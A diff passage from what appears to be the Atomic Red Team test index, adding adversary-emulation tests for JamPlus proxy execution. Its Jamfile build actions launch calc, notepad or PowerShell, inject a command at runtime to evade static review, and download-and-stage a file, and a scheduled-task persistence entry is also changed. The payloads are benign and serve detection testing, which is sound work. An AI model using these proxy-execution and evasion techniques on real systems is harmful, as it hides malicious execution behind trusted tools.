+        Expected output: notepad.exe launches as a child process of jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the custom jam file in
+          type: path
+          default: "$env:TEMP\\T1127.003_test4b"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: 'Write-Host "Run test 1''s get_prereq_command first to
+          install JamPlus and Jambase.jam."
+
+          '
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @'
+          actions RunPayload
+          {
+              cmd.exe /c start "" notepad.exe
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          '@ | Set-Content -Path "#{work_dir}\build_instructions.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}" -f build_instructions.jam payload
+          Pop-Location
+        cleanup_command: |
+          Get-Process notepad -ErrorAction Ignore | Stop-Process -Force -ErrorAction Ignore
+          Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+    - name: JamPlus proxy execution - payload download and execute via jam build action
+      auto_generated_guid: 424b5096-2c96-44a0-a48f-ef66bb9d5638
+      description: |
+        Writes a Jamfile.jam whose build action downloads a benign file from a local/looped-back source and writes it to disk via jam, simulating the download-and-stage step adversaries perform before executing a second-stage payload through JamPlus, without actually executing attacker-controlled content.
+        Expected output: a file is retrieved and written to disk by a process spawned from jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test5"
+        staged_file:
+          description: Path the proxied process will write to
+          type: path
+          default: "$env:TEMP\\T1127.003_staged.txt"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+          $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+          if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+          $zipPath = "$env:TEMP\jamplus.zip"
+          Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+          $extractDir = Split-Path "#{jam_path}"
+          New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+          Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+          Remove-Item $zipPath -Force
+          if (-not (Test-Path "#{jam_path}")) {
+            $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+            if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+          }
+          $jamDir = Split-Path "#{jam_path}"
+          if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+            $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+            if ($jambase) {
+              Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+            } else {
+              Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+            }
+          }
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @"
+          actions Stage
+          {
+              powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md' -OutFile '#{staged_file}' -UseBasicParsing"
+          }
+          Stage payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          "@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}"
+          Pop-Location
+        cleanup_command: |
+          Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+          Remove-Item "#{staged_file}" -Force -ErrorAction Ignore
   T1542:
     technique:
       type: attack-pattern
@@ -17744,7 +18575,7 @@ privilege-escalation:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'schtasks /create /TN "ProactiveScan" /TR "wscript.exe \"%APPDATA%\Microsoft\Chkdsk.js\"
           -scan Kdw6gG7cpOSZsBeH" /SC ONLOGON /F
 
@@ -29987,7 +30818,7 @@ execution:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'schtasks /create /TN "ProactiveScan" /TR "wscript.exe \"%APPDATA%\Microsoft\Chkdsk.js\"
           -scan Kdw6gG7cpOSZsBeH" /SC ONLOGON /F
 
@@ -33557,7 +34388,7 @@ execution:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.645Z'
-      name: JamPlus
+      name: 'Trusted Developer Utilities Proxy Execution: JamPlus'
       description: |-
         Adversaries may use `JamPlus` to proxy the execution of a malicious script. `JamPlus` is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio.(Citation: JamPlus manual)
 
@@ -33577,7 +34408,312 @@ execution:
       - Windows
       x_mitre_version: '2.0'
       x_mitre_remote_support: false
-    atomic_tests: []
+      identifier: T1127.003
+    atomic_tests:
+    - name: JamPlus proxy execution - launch calc.exe via Jamfile.jam action
+      auto_generated_guid: 5f7f863b-b6e5-4eb3-98af-9844d194137e
+      description: |
+        Writes a minimal Jamfile.jam whose build action shell-executes calc.exe, then invokes jam.exe against it. Mirrors the reported abuse pattern of using JamPlus's build actions to proxy execution of an arbitrary binary from a reputable developer tool.
+        Expected output: calc.exe launches as a child process of jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test1"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+          $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+          if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+          $zipPath = "$env:TEMP\jamplus.zip"
+          Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+          $extractDir = Split-Path "#{jam_path}"
+          New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+          Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+          Remove-Item $zipPath -Force
+          if (-not (Test-Path "#{jam_path}")) {
+            $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+            if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+          }
+          $jamDir = Split-Path "#{jam_path}"
+          if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+            $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+            if ($jambase) {
+              Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+            } else {
+              Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+            }
+          }
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @'
+          actions RunPayload
+          {
+              calc.exe
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          '@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}"
+          Pop-Location
+        cleanup_command: 'Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+
+          '
+    - name: JamPlus proxy execution - launch PowerShell via Jamfile.jam action
+      auto_generated_guid: 51b6913b-f96a-4d18-9802-41d4c5d4f995
+      description: |
+        Writes a Jamfile.jam whose build action invokes powershell.exe to write a marker file, simulating an adversary using JamPlus to proxy execution of a PowerShell payload rather than a GUI binary.
+        Expected output: a marker file is created by the powershell.exe process spawned from jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test2"
+        marker_file:
+          description: File the proxied PowerShell process will create
+          type: path
+          default: "$env:TEMP\\T1127.003_marker.txt"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+          $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+          if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+          $zipPath = "$env:TEMP\jamplus.zip"
+          Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+          $extractDir = Split-Path "#{jam_path}"
+          New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+          Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+          Remove-Item $zipPath -Force
+          if (-not (Test-Path "#{jam_path}")) {
+            $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+            if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+          }
+          $jamDir = Split-Path "#{jam_path}"
+          if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+            $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+            if ($jambase) {
+              Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+            } else {
+              Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+            }
+          }
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @"
+          actions RunPayload
+          {
+              powershell.exe -NoProfile -Command "Set-Content -Path '#{marker_file}' -Value 'T1127.003 test'"
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          "@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}"
+          Pop-Location
+        cleanup_command: |
+          Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+          Remove-Item "#{marker_file}" -Force -ErrorAction Ignore
+    - name: JamPlus proxy execution - payload injected via command-line variable substitution
+      auto_generated_guid: 077fb22c-fe92-4abd-aecf-31339324864b
+      description: |
+        Writes an innocuous-looking Jamfile.jam whose action body only references a variable, with no payload embedded in the file itself. The actual command is supplied entirely via a jam -s command-line variable at invocation time, so the Jamfile would pass a static content review while the executed command is assembled only at runtime. Simulates a supply-chain-style abuse pattern where a pre-approved, benign-looking build script is weaponized purely through its invocation parameters.
+        Expected output: calc.exe launches as a child process of jam.exe, despite the Jamfile containing no reference to calc.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test3b"
+        payload_command:
+          description: Command injected at invocation time via the PAYLOAD variable
+          type: string
+          default: calc.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: 'Write-Host "Run test 1''s get_prereq_command first to
+          install JamPlus and Jambase.jam."
+
+          '
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @'
+          actions RunPayload
+          {
+              $(PAYLOAD)
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          '@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}" -s"PAYLOAD=#{payload_command}" payload
+          Pop-Location
+        cleanup_command: 'Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+
+          '
+    - name: JamPlus proxy execution - command execution via explicitly named Jamfile
+      auto_generated_guid: cab43461-dbf0-4786-a9bc-857067272f8d
+      description: |
+        Writes a build-instructions file under a non-default filename and invokes JamPlus against it explicitly using the -f flag, rather than relying on JamPlus's default Jamfile.jam auto-discovery. Demonstrates a distinct invocation path that may evade detections keyed only on the default filename.
+        Expected output: notepad.exe launches as a child process of jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the custom jam file in
+          type: path
+          default: "$env:TEMP\\T1127.003_test4b"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: 'Write-Host "Run test 1''s get_prereq_command first to
+          install JamPlus and Jambase.jam."
+
+          '
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @'
+          actions RunPayload
+          {
+              cmd.exe /c start "" notepad.exe
+          }
+          RunPayload payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          '@ | Set-Content -Path "#{work_dir}\build_instructions.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}" -f build_instructions.jam payload
+          Pop-Location
+        cleanup_command: |
+          Get-Process notepad -ErrorAction Ignore | Stop-Process -Force -ErrorAction Ignore
+          Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+    - name: JamPlus proxy execution - payload download and execute via jam build action
+      auto_generated_guid: 424b5096-2c96-44a0-a48f-ef66bb9d5638
+      description: |
+        Writes a Jamfile.jam whose build action downloads a benign file from a local/looped-back source and writes it to disk via jam, simulating the download-and-stage step adversaries perform before executing a second-stage payload through JamPlus, without actually executing attacker-controlled content.
+        Expected output: a file is retrieved and written to disk by a process spawned from jam.exe.
+      supported_platforms:
+      - windows
+      input_arguments:
+        jam_path:
+          description: Path to the JamPlus executable (jam.exe)
+          type: path
+          default: C:\JamPlus\jam.exe
+        work_dir:
+          description: Scratch directory to build the Jamfile.jam in
+          type: path
+          default: "$env:TEMP\\T1127.003_test5"
+        staged_file:
+          description: Path the proxied process will write to
+          type: path
+          default: "$env:TEMP\\T1127.003_staged.txt"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: JamPlus (jam.exe) and its required Jambase.jam must both exist
+          at the specified path
+        prereq_command: |
+          $jamDir = Split-Path "#{jam_path}"
+          if ((Test-Path "#{jam_path}") -and (Test-Path (Join-Path $jamDir "Jambase.jam"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $releaseInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/jamplus/jamplus/releases/latest" -UseBasicParsing
+          $asset = $releaseInfo.assets | Where-Object { $_.name -like "*win*" -and $_.name -like "*.zip" } | Select-Object -First 1
+          if (-not $asset) { $asset = $releaseInfo.assets | Where-Object { $_.name -like "*.zip" } | Select-Object -First 1 }
+          $zipPath = "$env:TEMP\jamplus.zip"
+          Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zipPath -UseBasicParsing
+          $extractDir = Split-Path "#{jam_path}"
+          New-Item -ItemType Directory -Path $extractDir -Force | Out-Null
+          Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+          Remove-Item $zipPath -Force
+          if (-not (Test-Path "#{jam_path}")) {
+            $found = Get-ChildItem -Path $extractDir -Recurse -Filter "jam.exe" | Select-Object -First 1
+            if ($found) { Move-Item $found.FullName "#{jam_path}" -Force }
+          }
+          $jamDir = Split-Path "#{jam_path}"
+          if (-not (Test-Path (Join-Path $jamDir "Jambase.jam"))) {
+            $jambase = Get-ChildItem -Path $extractDir -Recurse -Filter "Jambase.jam" | Select-Object -First 1
+            if ($jambase) {
+              Copy-Item $jambase.FullName (Join-Path $jamDir "Jambase.jam") -Force
+            } else {
+              Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
+            }
+          }
+      executor:
+        name: powershell
+        command: |
+          New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
+          @"
+          actions Stage
+          {
+              powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md' -OutFile '#{staged_file}' -UseBasicParsing"
+          }
+          Stage payload ;
+          NotFile payload ;
+          Always payload ;
+          Depends all : payload ;
+          "@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
+          Push-Location "#{work_dir}"
+          & "#{jam_path}"
+          Pop-Location
+        cleanup_command: |
+          Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
+          Remove-Item "#{staged_file}" -Force -ErrorAction Ignore
   T1569.001:
     technique:
       type: attack-pattern
@@ -38020,7 +39156,7 @@ persistence:
       - windows
       executor:
         name: command_prompt
-        elevation_required: false
+        elevation_required: true
         command: 'schtasks /create /TN "ProactiveScan" /TR "wscript.exe \"%APPDATA%\Microsoft\Chkdsk.js\"
           -scan Kdw6gG7cpOSZsBeH" /SC ONLOGON /F
 
